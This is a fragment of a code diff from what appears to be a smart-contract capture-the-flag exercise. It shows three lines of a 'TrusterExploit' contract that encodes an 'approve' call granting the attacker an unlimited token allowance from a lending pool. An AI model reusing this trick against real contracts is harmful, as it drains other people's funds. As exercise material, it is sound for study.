@@ -44,3 +44,4 @@ contract TrusterLenderPool is ReentrancyGuard {
 contract TrusterExploit {
         IERC20 token = IERC20(_token);
             "approve(address, uint256)", address(this), int(-1)
+
